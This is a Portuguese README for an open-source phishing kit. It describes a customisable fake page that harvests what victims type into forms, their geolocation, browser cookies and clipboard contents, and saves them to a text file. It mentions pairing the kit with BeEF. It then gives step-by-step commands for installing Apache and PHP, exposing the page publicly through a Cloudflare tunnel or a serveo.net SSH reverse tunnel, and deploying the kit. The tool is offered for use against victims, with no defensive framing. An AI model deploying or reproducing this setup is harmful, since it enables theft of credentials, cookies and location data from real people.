# H00ks_T0x1na_Ph1shing

Ferramenta de Phsishing Completa e Personalizavel e de Codigo livre.
![git-2](https://github.com/user-attachments/assets/fd355633-7191-4e43-9383-8ad5a1cb1107)

Precisa de um servidor externo como na foto cloudflare mas podem ser outros como OpenSSH.... 
![image](https://github.com/user-attachments/assets/2f8fbf71-55bf-4b95-93e2-cdd57d49754f)




Necessita do php para coletar os dados....



![image](https://github.com/user-attachments/assets/90cd1590-dd47-4f30-af08-9e9e5ba9691f)





Ferramenta completa de coleta de dados, desde informções do formulario que é personalizavel, tem coleta de localização, cookies do navegador (Não manipulavel, favor cofigurar corretamente no beef).... E personalizavel ao ponto de poder trocar a imagem de fundo







Porem salve a imagem do fundo da pagina sempre como "1.jpg" 
![image](https://github.com/user-attachments/assets/1a344a19-07b0-49e2-affa-de85070b45bd)


Volta as informaçoes em dados.txt... Localização (volta em longitude e a latitude (Localização: Lat: loc do alvo Long: loc do alvo)), se tem cookies no navegador, volta o formulario digitado, e a clipboard da vitima .... ![git](https://github.com/user-attachments/assets/280c999c-68cd-499e-88e4-71345c77ea04)

Com Cloud Flare:

Baixe e Inicie o Servidor Apache2:
"sudo apt-get install apache2 -y"
"sudo systemctl start apache2 && sudo systemctl enable apache2.service"

Baixe o php:
"sudo apt-get install php -y"

Inicie o php:
"php -S localhost:8080"

Instale o CloudFlare desta maneira:
"curl -O https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.deb
sudo dpkg -i cloudflared-stable-linux-amd64.deb"

Faça login no cloudflare e crie a conta:
"cloudflared tunnel login"

Inicie o servidor cloudflare:
"cloudflared tunnel --url http://localhost:8080"

Diretorios corretos:
"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
"mkdir uploads && cd ../"
"chmod +x H00ks_T0x1na_Ph1shing/*"
"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"

or


Baixe e Inicie o Servidor Apache2:
"sudo apt-get install apache2"
"sudo systemctl start apache2 && sudo systemctl enable apache2.service"

Baixe o php:
"sudo apt-get install php -y"


Inicie o php:
php -S localhost:8080

Use o OpenSSH detsa maneira:
"ssh -R 80:localhost:443 serveo.net"

Diretorios corretos:
"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
"mkdir uploads && cd ../"
"chmod +x H00ks_T0x1na_Ph1shing/*"
"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"


Hacked By: z3ldr1s
Vulgo: ZEL ZEL

Aproveite :)
